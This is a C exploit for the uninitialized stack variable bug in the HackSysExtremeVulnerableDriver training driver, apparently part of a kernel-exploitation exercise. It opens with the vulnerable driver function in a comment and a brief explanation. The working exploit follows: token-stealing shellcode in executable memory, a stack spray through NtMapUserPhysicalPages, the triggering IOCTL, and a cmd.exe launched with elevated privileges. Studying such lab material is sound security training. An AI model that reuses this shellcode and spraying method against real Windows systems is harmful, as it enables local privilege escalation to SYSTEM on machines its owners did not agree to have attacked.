
/*

NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) {
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
 
#ifdef SECURE
    // Secure Note: This is secure because the developer is properly initializing
    // UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling
    // the callback
    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = {0};
#else
    // Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability
    // because the developer is not initializing 'UNINITIALIZED_STACK_VARIABLE' structure
    // before calling the callback when 'MagicValue' does not match 'UserValue'
    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;
#endif
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer,
                     sizeof(UNINITIALIZED_STACK_VARIABLE),
                     (ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE));
 
        // Get the value from user mode
        UserValue = *(PULONG)UserBuffer;
 
        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] UninitializedStackVariable Address: 0x%p\n", &UninitializedStackVariable);
 
        // Validate the magic value
        if (UserValue == MagicValue) {
            UninitializedStackVariable.Value = UserValue;
            UninitializedStackVariable.Callback = &UninitializedStackVariableObjectCallback;
        }
 
        DbgPrint("[+] UninitializedStackVariable.Value: 0x%p\n", UninitializedStackVariable.Value);
        DbgPrint("[+] UninitializedStackVariable.Callback: 0x%p\n", UninitializedStackVariable.Callback);
 
#ifndef SECURE
        DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
#endif
 
        // Call the callback function
        if (UninitializedStackVariable.Callback) {
            UninitializedStackVariable.Callback();
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
 
'''
If we pass the driver function the correct magic value then it initializes
the variable and callback parameters. If we pass an incorrect value then this does not happen.
The problem here is that the variable is not set to a specific value when it is defined.
As the variable resides on the stack it will contain whatever random junk is left behind by previous function calls.
Notice that the code has a check (if UninitializedStackVariable.Callback...) which does nothing to protect it from a crash.
'''

<-----------------
To Put it simply The driver Calls a callback on an-uninitialized value, offering the attaker the
chance to perform heap spay in order to facilitate that memory address with a pointer to our allocated shellcode.
---------------->

*/

#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	char Buff[20] = "\xDD\xDD\xDD\xDD";
	DWORD outBytes = 0;
	
	typedef NTSTATUS(__stdcall *pfNtMapUserPhysicalPages)(
		PINT BaseAddress,
		UINT32 NumberOfPages,
		PBYTE PageFrameNumbers
	);

	pfNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfNtMapUserPhysicalPages)GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");

	char pl[60] =
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\xC3"
		;
	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	LPVOID plAddress = &pla;
	char HeapSpray[0x1000] = { 0 };
	int BaseAddress = 0;
	for (int j = 0; j < 0x1000 / 4; j++) {
		memcpy(HeapSpray + (j*4), plAddress, 4);
	}

	NtMapUserPhysicalPages(&BaseAddress,1024,(PBYTE)&HeapSpray);

	DeviceIoControl(dev, 0x22202F, &Buff, sizeof(Buff), NULL, 0, &outBytes, (LPOVERLAPPED)NULL);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}
